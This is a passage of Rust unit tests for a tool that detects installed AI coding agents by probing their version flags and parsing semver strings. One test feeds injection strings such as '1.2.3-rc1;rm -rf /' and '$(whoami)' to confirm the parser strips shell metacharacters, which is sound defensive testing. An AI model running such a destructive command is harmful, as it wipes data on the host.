            "gsd has no --version flag at all"
        );
        assert_eq!(
            flags_for("rtk"),
            vec![
                "tool --version 2>/dev/null",
                "tool version 2>/dev/null",
                "tool --help 2>/dev/null",
            ],
            "an unknown id tries all three, in order"
        );

        // And the chain STOPS at the first flag that yields a semver.
        fn version_on_first(_u: &str, _h: &str, script: &str) -> (i32, String) {
            TRIED.with(|t| t.borrow_mut().push(script.to_string()));
            (0, "9.9.9".to_string())
        }
        TRIED.with(|t| t.borrow_mut().clear());
        assert_eq!(
            probe_version(version_on_first, "agent", "/home/agent", "rtk", "tool"),
            "9.9.9"
        );
        assert_eq!(
            TRIED.with(|t| t.borrow().len()),
            1,
            "first semver wins — the later flags must not run"
        );
    }

    /// The cache writer and the `--report-format=json` report share this one
    /// projection so the two shapes cannot drift. Replacing it wholesale with
    /// `Default::default()` — JSON `null` — survived, which empties every agent
    /// row in both the cache REUSE-03 reads and the operator-facing report.
    #[test]
    fn a_record_serializes_to_the_five_cache_fields() {
        let v = record_value(&AgentRecord {
            id: "claude-code".to_string(),
            binary: "claude".to_string(),
            path: "/home/agent/.local/bin/claude".to_string(),
            version: "2.1.0".to_string(),
            status: "healthy".to_string(),
        });
        assert_eq!(v["id"], "claude-code");
        assert_eq!(v["binary"], "claude");
        assert_eq!(v["path"], "/home/agent/.local/bin/claude");
        assert_eq!(v["version"], "2.1.0");
        assert_eq!(v["status"], "healthy");
        assert_eq!(
            v.as_object().map(serde_json::Map::len),
            Some(5),
            "exactly the five fields the cache reader expects, no more"
        );
    }

    // --- probe_one: the resolve gate, the legacy --help gate, the gsd fallback ---

    fn found(_u: &str, _h: &str, script: &str) -> (i32, String) {
        if script.starts_with("command -v") {
            (0, "/home/agent/.local/bin/tool".to_string())
        } else if script.contains("--help") {
            (0, String::new())
        } else {
            (0, "1.2.3".to_string())
        }
    }
    fn found_but_help_fails(_u: &str, _h: &str, script: &str) -> (i32, String) {
        if script.starts_with("command -v") {
            (0, "/home/agent/.local/bin/tool".to_string())
        } else if script.contains("--help") {
            (1, String::new())
        } else {
            (0, "1.2.3".to_string())
        }
    }
    fn nonzero_rc(_u: &str, _h: &str, _script: &str) -> (i32, String) {
        (1, "/home/agent/.local/bin/tool".to_string())
    }
    fn empty_stdout(_u: &str, _h: &str, _script: &str) -> (i32, String) {
        (0, String::new())
    }

    /// A binary counts as resolved only when `command -v` BOTH exits 0 AND names
    /// a path. `replace && with ||` survived, and so did inverting the `rc == 0`:
    /// either way a failed lookup that happens to print something, or a success
    /// that prints nothing, is treated as an installed agent — and the record
    /// goes into the detect cache that REUSE-03 and REMEDIATE-04 later read.
    #[test]
    fn a_binary_is_resolved_only_on_exit_zero_and_a_path() {
        let ok = probe_one(found, "agent", "/home/agent", "rtk", "rtk");
        assert_eq!(ok.status, "healthy");
        assert_eq!(ok.path, "/home/agent/.local/bin/tool");

        for (run, why) in [
            (nonzero_rc as LoginRun, "non-zero rc with a path on stdout"),
            (empty_stdout as LoginRun, "exit 0 with no path"),
        ] {
            let rec = probe_one(run, "agent", "/home/agent", "rtk", "rtk");
            assert_eq!(rec.status, "absent", "{why} must not resolve");
            assert_eq!(rec.path, "", "{why} must leave the path empty");
        }
    }

    /// The three legacy ids gate health on `--help` exiting 0 as well as on a
    /// parsed version; every other id does not. Without this, a legacy agent
    /// whose `--help` is broken still reports healthy.
    #[test]
    fn only_legacy_ids_are_gated_on_help_exiting_zero() {
        let legacy = probe_one(
            found_but_help_fails,
            "agent",
            "/home/agent",
            "claude-code",
            "claude",
        );
        assert_eq!(
            legacy.status, "broken",
            "a legacy id with a failing --help is broken even with a version"
        );
        assert_eq!(legacy.version, "1.2.3", "the version still parses");

        let generic = probe_one(found_but_help_fails, "agent", "/home/agent", "rtk", "rtk");
        assert_eq!(
            generic.status, "healthy",
            "a non-legacy id is not gated on --help"
        );
    }

    // --- the gsd deployed-VERSION fallback, owner-gated ---

    fn me() -> String {
        nix::unistd::User::from_uid(nix::unistd::getuid())
            .ok()
            .flatten()
            .map(|u| u.name)
            .expect("the test process has a passwd entry")
    }

    /// GSD's binary is a bootstrapper, so an absent binary still counts as
    /// present when the deployed VERSION file is there — but ONLY when that file
    /// is owned by the install user, because a planted symlink to a root-owned
    /// file would otherwise be read as GSD's version.
    ///
    /// `delete !` survived on that owner gate, which inverts it exactly: the
    /// files we own are refused and the foreign-owned ones are accepted.
    #[test]
    fn the_gsd_version_fallback_is_owner_gated_and_classifies_by_body() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("VERSION");

        std::fs::write(&f, "1.37.1\n").unwrap();
        let rec = gsd_version_file_record(&me(), f.to_str().unwrap())
            .expect("a file we own must be accepted");
        assert_eq!(rec.id, "gsd");
        assert_eq!(rec.version, "1.37.1");
        assert_eq!(rec.status, "healthy");

        // The fallback is GSD-ONLY: its binary is a bootstrapper, so an absent
        // one still counts as present. `replace == with !=` in probe_one
        // survived, which applies the fallback to every OTHER agent and denies
        // it to gsd — so any tool with a stray file at that path would report
        // installed, and gsd itself would report absent.
        let home = dir.path().parent().unwrap().to_str().unwrap().to_string();
        std::fs::create_dir_all(format!("{home}/.claude/gsd-core")).unwrap();
        std::fs::write(format!("{home}/.claude/gsd-core/VERSION"), "1.37.1\n").unwrap();
        fn never_resolves(_u: &str, _h: &str, _s: &str) -> (i32, String) {
            (1, String::new())
        }
        let gsd = probe_one(never_resolves, &me(), &home, "gsd", "gsd-core");
        assert_eq!(
            gsd.status, "healthy",
            "gsd with no binary but a deployed VERSION is present"
        );
        assert_eq!(gsd.version, "1.37.1");
        let other = probe_one(never_resolves, &me(), &home, "rtk", "rtk");
        assert_eq!(
            other.status, "absent",
            "no other agent gets the VERSION-file fallback"
        );

        // Present and ours, but empty → present-but-broken, not absent.
        std::fs::write(&f, "   \n\t\n").unwrap();
        let rec = gsd_version_file_record(&me(), f.to_str().unwrap())
            .expect("an empty file is still a presence signal");
        assert_eq!(rec.version, "");
        assert_eq!(rec.status, "broken");

        // Owned by someone else → refused. A name with no passwd entry cannot
        // match the file's uid, which is the same rejection path a foreign owner
        // takes, without needing a second real account on the runner.
        assert!(
            gsd_version_file_record("no-such-user-agentlinux-fixture", f.to_str().unwrap())
                .is_none(),
            "a file not owned by the install user must be refused"
        );

        assert!(
            gsd_version_file_record(&me(), dir.path().join("absent").to_str().unwrap()).is_none(),
            "a missing VERSION file is absent, not broken"
        );
    }

    /// The child env for the login-shell probe hop. Five mutants survived here,
    /// every one of them replacing the whole vector — empty, or a fabricated
    /// pair. An empty env means the probe child gets no PATH, so `command -v`
    /// fails for every agent and a fully-provisioned host reports as greenfield.
    ///
    /// Also pins the documented invariant that only `AGENTLINUX_*` is forwarded:
    /// the comment above the function reasons that those are all path/config
    /// seams and never secrets, and nothing enforced the filter that makes the
    /// claim true.
    #[test]
    fn the_probe_child_env_carries_path_home_and_only_agentlinux_seams() {
        let mut env_scope = crate::test_support::EnvScope::new();
        env_scope.set("AGENTLINUX_CATALOG_DIR", "/opt/fixture/catalog");
        env_scope.set("NOT_AGENTLINUX_SECRET", "hunter2");

        let env = probe_env("/home/agent");
        let get = |k: &str| env.iter().find(|(n, _)| n == k).map(|(_, v)| v.clone());

        assert_eq!(get("HOME").as_deref(), Some("/home/agent"));
        let path = get("PATH").expect("the child must get a PATH");
        assert!(
            path.contains("/home/agent/.local/bin") && path.contains("/home/agent/.npm-global/bin"),
            "both agent-owned bin dirs must resolve before the profile loads, got {path:?}"
        );

        assert_eq!(
            get("AGENTLINUX_CATALOG_DIR").as_deref(),
            Some("/opt/fixture/catalog"),
            "the seams the parent runs under must reach the probe child"
        );
        assert!(
            get("NOT_AGENTLINUX_SECRET").is_none(),
            "only AGENTLINUX_* is forwarded — the invariant the doc comment rests on"
        );
    }

    #[test]
    fn extract_semver_finds_first_match() {
        assert_eq!(extract_semver("1.2.3").as_deref(), Some("1.2.3"));
        assert_eq!(
            extract_semver("v0.42.4 (Claude Code)").as_deref(),
            Some("0.42.4")
        );
        assert_eq!(
            extract_semver("Version: 2.11.0-beta.1 build").as_deref(),
            Some("2.11.0-beta.1")
        );
        // Leading two-part number is skipped; the real 3-part match wins.
        assert_eq!(
            extract_semver("released 2024 as 1.7.0").as_deref(),
            Some("1.7.0")
        );
        // No 3-part semver → None (adversarial / non-version output).
        assert_eq!(extract_semver("no version here 12.9"), None);
        assert_eq!(extract_semver(""), None);
    }

    /// Each of the three digit runs must consume at least one digit.
    ///
    /// `replace > with >=` survived on the `digits` closure's "did I consume
    /// anything?" return. Relaxed, an EMPTY digit run counts as a match, so a
    /// dotted string with missing components parses as a version: `1..2` becomes
    /// the reported version of an installed agent, and every downstream semver
    /// comparison — divergence, the compatibility window, the upgrade decision —
    /// is then made against a string that is not a version.
    #[test]
    fn a_component_with_no_digits_is_not_a_version() {
        for text in [
            "1..2",   // MINOR empty
            "1.2..",  // PATCH empty
            "1..",    // both empty
            "1..2.3", // empty MINOR, digits after
            "v1..0",  // the leading-v form the probes actually emit
        ] {
            assert_eq!(
                extract_semver(text),
                None,
                "{text:?} has an empty component and is not a semver"
            );
        }

        // The neighbouring well-formed cases still match, so the guard is not
        // merely rejecting everything.
        assert_eq!(extract_semver("1.0.2").as_deref(), Some("1.0.2"));
        assert_eq!(extract_semver("x1.2.3y").as_deref(), Some("1.2.3"));
    }

    #[test]
    fn extract_semver_rejects_shell_metacharacters_in_prerelease() {
        // A prerelease tail stops at the first non-[a-z0-9.-] byte — `$(...)`
        // injection bytes never enter the captured version.
        assert_eq!(
            extract_semver("1.2.3-rc1;rm -rf /").as_deref(),
            Some("1.2.3-rc1")
        );
        assert_eq!(
            extract_semver("1.2.3-a$(whoami)").as_deref(),
            Some("1.2.3-a")
        );
    }

    #[test]
    fn extract_semver_prerelease_boundary() {
        // A bare trailing hyphen with no tail is dropped (empty prerelease is not
        // a match) — the `j > tail_start` guard; a regression that made `i = j`
        // unconditional would return "1.2.3-" and change a cached gate value.
        assert_eq!(extract_semver("1.2.3-").as_deref(), Some("1.2.3"));
        assert_eq!(
            extract_semver("1.2.3-rc1 (build)").as_deref(),
            Some("1.2.3-rc1")
        );
        // `+build` metadata is outside the tail charset → stops at '+'.
        assert_eq!(
            extract_semver("1.2.3-rc1+build5").as_deref(),
            Some("1.2.3-rc1")
        );
    }

    #[test]
    fn extract_semver_leftmost_and_no_fourth_component() {
        // Two full semvers → the leftmost wins (grep -Eo leftmost match).
        assert_eq!(extract_semver("a 3.4.5 b 6.7.8").as_deref(), Some("3.4.5"));
        // A fourth dotted component is not absorbed into the version.
        assert_eq!(extract_semver("1.2.3.4").as_deref(), Some("1.2.3"));
    }

    #[test]
    fn extract_semver_uppercase_prerelease_truncates_to_release() {
        // Prerelease charset is lowercase-only (mirrors Bash [a-z0-9.-]); an
        // uppercase tail is dropped rather than captured. Intentional narrowing —
        // pinned so a future uppercase-versioned tool's truncation isn't a surprise.
        assert_eq!(extract_semver("1.2.3-RC1").as_deref(), Some("1.2.3"));
    }

    #[test]
    fn classify_legacy_requires_help_ok_and_version() {
        // Legacy: needs BOTH a version and --help exit 0.
        assert_eq!(classify("claude-code", "1.2.3", true), "healthy");
        assert_eq!(classify("claude-code", "1.2.3", false), "broken");
        assert_eq!(classify("claude-code", "", true), "broken");
        // Generic: version alone is the health signal (--help conventions vary).
        assert_eq!(classify("gitleaks", "8.18.0", false), "healthy");
        assert_eq!(classify("gitleaks", "", true), "broken");
    }
}

#[cfg(test)]
mod probe_chain_tests {
    //! The version-flag fallback chain and the health gates. None of this had a
    //! test: only the pure leaves (verify_binary, extract_semver, classify,
    //! agent_rows) were covered, so a regression that probes `--version` and
    //! drops the remaining flags compiled, passed, and surfaced only as a wrong
    //! REUSE/REMEDIATE verdict on a real host.
    use super::*;
    use std::cell::RefCell;

    thread_local! {
        static SCRIPTS: RefCell<Vec<String>> = const { RefCell::new(Vec::new()) };
    }

    fn scripts() -> Vec<String> {
        SCRIPTS.with(|s| s.borrow().clone())
    }

    fn reset() {
        SCRIPTS.with(|s| s.borrow_mut().clear());
    }

    /// Only `--help` yields a version — the third flag in the generic chain.
    fn only_help_has_a_version(_u: &str, _h: &str, script: &str) -> (i32, String) {
        SCRIPTS.with(|s| s.borrow_mut().push(script.to_string()));
        if script.contains("command -v") {
            (0, "/home/agent/.npm-global/bin/tool".to_string())
        } else if script.contains("--help") {
            (0, "tool, version 3.4.5".to_string())
        } else {
            (1, String::new())
        }
    }

    /// Nothing is on PATH.
    fn nothing_resolves(_u: &str, _h: &str, script: &str) -> (i32, String) {
        SCRIPTS.with(|s| s.borrow_mut().push(script.to_string()));
        (1, String::new())
    }

    /// Resolves and reports a version on the FIRST flag.
    fn version_on_first_flag(_u: &str, _h: &str, script: &str) -> (i32, String) {
        SCRIPTS.with(|s| s.borrow_mut().push(script.to_string()));
        if script.contains("command -v") {
            (0, "/home/agent/.local/bin/claude".to_string())
        } else {
            (0, "2.1.98".to_string())
        }
    }

    #[test]
    fn the_generic_chain_falls_through_version_then_help() {
        reset();
        let rec = probe_one(
            only_help_has_a_version,
            "agent",
            "/home/agent",
            "tool",
            "tool",
        );
        assert_eq!(rec.version, "3.4.5");
        // All three flags were tried, in order, and only until one produced a
        // semver.
        let tried: Vec<String> = scripts()
            .into_iter()
            .filter(|s| !s.contains("command -v"))
            .collect();
        assert_eq!(tried.len(), 3, "tried={tried:?}");
        assert!(tried[0].contains("tool --version"));
        assert!(tried[1].contains("tool version"));
        assert!(tried[2].contains("tool --help"));
    }

    #[test]
    fn the_first_semver_wins_and_stops_the_chain() {
        reset();
        let rec = probe_one(
            version_on_first_flag,
            "agent",
            "/home/agent",
            "some-id",
            "tool",
        );
        assert_eq!(rec.version, "2.1.98");
        let tried: Vec<String> = scripts()
            .into_iter()
            .filter(|s| !s.contains("command -v"))
            .collect();
        assert_eq!(
            tried.len(),
            1,
            "the chain must stop at the first hit: {tried:?}"
        );
    }

    #[test]
    fn the_legacy_ids_probe_only_their_own_flag() {
        // claude-code/playwright-cli parse --version; gsd has no --version flag
        // and parses --help. Probing the wrong one reports an empty version, i.e.
        // a broken agent.
        for (id, expected_flag) in [
            ("claude-code", "--version"),
            ("playwright-cli", "--version"),
            ("gsd", "--help"),
        ] {
            reset();
            probe_one(version_on_first_flag, "agent", "/home/agent", id, "tool");
            let tried: Vec<String> = scripts()
                .into_iter()
                // Exclude the resolve probe and the legacy `--help` HEALTH gate
                // (`… >/dev/null 2>&1`), keeping only the version flags.
                .filter(|s| !s.contains("command -v") && !s.contains(">/dev/null 2>&1"))
                .collect();
            assert_eq!(tried.len(), 1, "{id}: {tried:?}");
            assert!(tried[0].contains(expected_flag), "{id}: {tried:?}");
        }
    }

    #[test]
    fn an_unresolvable_binary_is_absent_with_no_version_probe() {
        reset();
        let rec = probe_one(nothing_resolves, "agent", "/home/agent", "tool", "tool");
        assert_eq!(rec.status, "absent");
        assert!(rec.path.is_empty());
        assert!(rec.version.is_empty());
        // No flag was probed — resolving the binary gates the whole chain.
        assert_eq!(scripts().len(), 1, "{:?}", scripts());
    }

    #[test]
    fn a_legacy_id_whose_help_exits_non_zero_is_broken() {
        // The legacy health gate: a resolvable binary reporting a version is
        // still `broken` when `--help` fails.
        fn help_fails(_u: &str, _h: &str, script: &str) -> (i32, String) {
            if script.contains("command -v") {
                (0, "/home/agent/.local/bin/claude".to_string())
            } else if script.contains(">/dev/null") {
                (1, String::new()) // the health gate
            } else {
                (0, "2.1.98".to_string())
            }
        }
        let rec = probe_one(help_fails, "agent", "/home/agent", "claude-code", "claude");
        assert_eq!(rec.status, "broken", "version={}", rec.version);
    }
}

#[cfg(test)]
mod scan_tests {
    use super::*;
    use tempfile::tempdir;

    /// A login runner that reports every probed binary as present at a
    /// predictable path with a fixed version — no shell, no host.
    fn found(_user: &str, _home: &str, script: &str) -> (i32, String) {
        if script.starts_with("command -v ") {
            (0, "/usr/local/bin/thing".to_string())
        } else {
            (0, "1.2.3".to_string())
        }
    }

    fn write_catalog(dir: &std::path::Path, body: &str) {
        std::fs::write(dir.join("catalog.json"), body).unwrap();
    }

    #[test]
    fn scan_probes_every_non_mcp_agent_in_the_catalog() {
        // `scan` used to hardcode the real login runner and the ambient catalog
        // dir, so replacing its whole body with `Vec::new()` — which makes the
        // detect cache claim nothing is installed, and every REUSE/REMEDIATE
        // verdict downstream wrong — passed the entire suite.
        let cat = tempdir().unwrap();
        write_catalog(
            cat.path(),
            r#"{"version":"0.3.6","agents":[
                {"id":"alpha","display_name":"A","description":"d","source_kind":"npm",
                 "pinned_version":"1.0.0","install_recipe_path":"i.sh",
                 "uninstall_recipe_path":"u.sh","post_install_verify":"command -v alpha",
                 "tags":["agent"]},
                {"id":"beta","display_name":"B","description":"d","source_kind":"npm",
                 "pinned_version":"1.0.0","install_recipe_path":"i.sh",
                 "uninstall_recipe_path":"u.sh","post_install_verify":"command -v beta",
                 "tags":["agent"]},
                {"id":"some-mcp","display_name":"M","description":"d","source_kind":"mcp",
                 "pinned_version":"1.0.0","install_recipe_path":"i.sh",
                 "uninstall_recipe_path":"u.sh","post_install_verify":"command -v m",
                 "tags":["mcp"]}
            ]}"#,
        );

        let records = scan_with(found, cat.path(), "agent", "/home/agent", SCAN_BUDGET);

        let ids: Vec<&str> = records.iter().map(|r| r.id.as_str()).collect();
        // mcp entries are excluded from the scan; the two agents are probed.
        assert_eq!(ids, vec!["alpha", "beta"], "records={records:?}");
        assert!(
            records.iter().all(|r| r.status == "healthy"),
            "records={records:?}"
        );
    }

    /// Two agents in the catalog, for the budget tests below.
    fn write_two_agent_catalog(dir: &std::path::Path) {
        write_catalog(
            dir,
            r#"{"version":"0.3.6","agents":[
                {"id":"alpha","display_name":"A","description":"d","source_kind":"npm",
                 "pinned_version":"1.0.0","install_recipe_path":"i.sh",
                 "uninstall_recipe_path":"u.sh","post_install_verify":"command -v alpha",
                 "tags":["agent"]},
                {"id":"beta","display_name":"B","description":"d","source_kind":"npm",
                 "pinned_version":"1.0.0","install_recipe_path":"i.sh",
                 "uninstall_recipe_path":"u.sh","post_install_verify":"command -v beta",
                 "tags":["agent"]}
            ]}"#,
        );
    }

    // An exhausted budget must leave the unprobed agents OUT of the cache and say
    // how many. Recording them would be a lie the rest of the system acts on:
    // absent means "not installed" to REUSE-03, so a scan that ran out of time
    // would report a healthy install as missing and let a plain install write
    // over it. The count is the operator's only signal that the scan was partial.
    #[test]
    fn an_exhausted_scan_budget_probes_nothing_and_says_how_many_it_skipped() {
        let mut env = crate::test_support::EnvScope::new();
        let dir = tempdir().unwrap();
        let transcript = dir.path().join("install.log");
        env.set("AGENTLINUX_LOG", &transcript);
        crate::provision::log::init();

        let cat = tempdir().unwrap();
        write_two_agent_catalog(cat.path());

        let records = scan_with(
            found,
            cat.path(),
            "agent",
            "/home/agent",
            std::time::Duration::ZERO,
        );
        assert!(
            records.is_empty(),
            "an unprobed agent must not be recorded at all: {records:?}"
        );

        let body = std::fs::read_to_string(&transcript).unwrap();
        assert!(
            body.contains("2 of 2 agents NOT probed"),
            "the skipped remainder must be named:\n{body}"
        );

        env.unset("AGENTLINUX_LOG");
    }

    // The negative control. Without it, firing the warning whenever `skipped >= 0`
    // — that is, on every scan ever — passes every other assertion here, and the
    // transcript of a completely healthy provision claims the scan was cut short.
    #[test]
    fn a_scan_that_finishes_inside_its_budget_reports_no_skips() {
        let mut env = crate::test_support::EnvScope::new();
        let dir = tempdir().unwrap();
        let transcript = dir.path().join("install.log");
        env.set("AGENTLINUX_LOG", &transcript);
        crate::provision::log::init();

        let cat = tempdir().unwrap();
        write_two_agent_catalog(cat.path());

        let records = scan_with(found, cat.path(), "agent", "/home/agent", SCAN_BUDGET);
        assert_eq!(records.len(), 2, "both agents were probed: {records:?}");

        let body = std::fs::read_to_string(&transcript).unwrap();
        assert!(
            !body.contains("NOT probed"),
            "nothing was skipped, so nothing may be reported:\n{body}"
        );

        env.unset("AGENTLINUX_LOG");
    }

    #[test]
    fn an_unreadable_catalog_degrades_to_an_empty_scan() {
        // The documented fallback, previously reachable only by breaking the
        // host's real catalog.
        let empty = tempdir().unwrap();
        assert!(scan_with(found, empty.path(), "agent", "/home/agent", SCAN_BUDGET).is_empty());
    }
}
